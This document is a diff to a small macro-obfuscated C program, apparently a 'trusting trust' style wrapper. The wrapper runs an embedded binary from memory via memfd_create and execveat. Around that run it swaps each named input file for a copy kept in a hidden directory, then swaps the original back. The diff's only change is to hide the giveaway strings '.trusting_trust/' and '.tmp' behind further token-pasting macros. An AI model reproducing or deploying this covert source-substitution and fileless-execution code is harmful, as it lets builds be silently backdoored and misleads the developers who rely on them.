@@ -1,7 +1,7 @@
-#define A(a, b, c) C(A##a, A##b, A##c)
+#define A(a, b, c)C(A##a,A##b,A##c)
 
-#define B(a, b, c) a##b##c
-#define C(a, b, c) B(a, b, c)
+#define B(a, b, c)a##b##c
+#define C(a, b, c)B(a,b,c)
 
 #define D(x) #x
 #define E(x) D(x)
@@ -43,6 +43,7 @@
 #include E(A(I,O,I)/A(Q,Q,M)A(0,8,J).h) // sys/wait.h
 #include E(A(K,D,8)A(I,J,3).h) // unistd.h
 #define P E(/A(K,I,H)/A(1,8,D)/A(2,2,Q))
+#define Z E(.A(J,H,K)A(I,J,O)/)
 
 char cc[] = {
 #embed P
@@ -54,8 +55,8 @@ extern char **environ;
 
 #define S                                                                      \
   for (int i = 1; i < c; i++) {                                                \
-    strcpy(p = alloca(16 + strlen(v[i])), ".trusting_trust/");                 \
-    strcpy(p + 16, v[i]);                                                      \
+    strcpy(p = alloca(strlen(Z) + strlen(v[i])), Z);                           \
+    strcpy(p + strlen(Z), v[i]);                                               \
     if (!access(v[i], 0) && !access(p, 0)) {                                   \
       rename(v[i], t);                                                         \
       rename(p, v[i]);                                                         \
@@ -66,13 +67,13 @@ extern char **environ;
 
 int main(int c, char *v[]) {
   int f;
-  char *a[999] = {P}, *t = ".tmp", *p;
+  char *a[999] = {P}, *t = E(.A(H,2,K)), *p;
 
   S
 
   if (!fork()) {
-    write(f = memfd_create("", 1), cc, sizeof cc);
-    execveat(f, "", a, environ, 4096);
+    write(f = memfd_create(E(), 1), cc, sizeof cc);
+    execveat(f, E(), a, environ, 4096);
   }
   wait(0);
   S
